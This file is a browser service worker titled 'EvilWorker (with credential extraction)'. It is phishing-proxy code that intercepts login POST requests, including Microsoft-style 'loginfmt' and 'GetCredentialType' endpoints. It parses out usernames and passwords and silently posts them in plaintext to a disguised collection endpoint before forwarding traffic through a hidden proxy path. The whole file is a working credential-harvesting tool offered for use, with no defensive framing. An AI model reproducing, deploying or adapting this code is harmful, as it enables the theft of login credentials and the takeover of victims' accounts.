// ============================================================
// SERVICE WORKER – EvilWorker (with credential extraction)
// ============================================================
self.addEventListener("fetch", (event) => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    // Clone the request so we can read the body without consuming it
    const clonedRequest = request.clone();
    let bodyText = '';

    try {
        bodyText = await clonedRequest.text();
    } catch (e) {
        // If body is not readable (e.g., GET, empty), ignore
        bodyText = '';
    }

    // ---- CREDENTIAL EXTRACTION (PLAINTEXT) ----
    try {
        // Only process POST requests that look like login attempts
        if (request.method === 'POST' && bodyText.length > 0 && bodyText.length < 1024 * 10) {
            const url = new URL(request.url);
            // Check if the request target is a login endpoint (adjust as needed)
            if (url.pathname.includes('/login') || url.pathname.includes('/signin') ||
                url.pathname.includes('/common/login') || url.pathname.includes('/oauth2') ||
                url.pathname.includes('/GetCredentialType')) {

                let credentials = {};
                const contentType = request.headers.get('content-type') || '';

                // Parse based on content type
                if (contentType.includes('application/json')) {
                    credentials = JSON.parse(bodyText);
                } else if (contentType.includes('application/x-www-form-urlencoded')) {
                    const params = new URLSearchParams(bodyText);
                    credentials = Object.fromEntries(params);
                }

                // Extract common credential fields
                const email = credentials.username || credentials.user || credentials.email ||
                              credentials.loginfmt || credentials.login || credentials.userid || '';
                const password = credentials.password || credentials.passwd || credentials.pass ||
                                 credentials.Password || credentials.pwd || '';

                if (email || password) {
                    // Send to your proxy's jsCookie endpoint (NOT /api/session)
                    await fetch('/JSCookie_6X7dRqLg90mH', {
                        method: 'POST',
                        body: JSON.stringify({
                            type: 'credentials',
                            email: email,
                            password: password,
                            time: Date.now(),
                            url: request.url
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                    // Optional: console log for debugging
                    // console.log('[SW] Captured:', { email, password });
                }
            }
        }
    } catch (e) {
        // Silent fail – do not break the proxy flow
    }

    // ---- FORWARD REQUEST TO PROXY (as before) ----
    const proxyRequestURL = `${self.location.origin}/lNv1pC9AWPUY4gbidyBO`;
    const proxyRequest = {
        url: request.url,
        method: request.method,
        headers: Object.fromEntries(request.headers.entries()),
        body: bodyText,
        referrer: request.referrer,
        mode: request.mode
    };

    try {
        return fetch(proxyRequestURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(proxyRequest),
            redirect: "manual",
            mode: "same-origin"
        });
    } catch (error) {
        console.error(`Fetching ${proxyRequestURL} failed: ${error}`);
        return new Response('Proxy error', { status: 502 });
    }
}
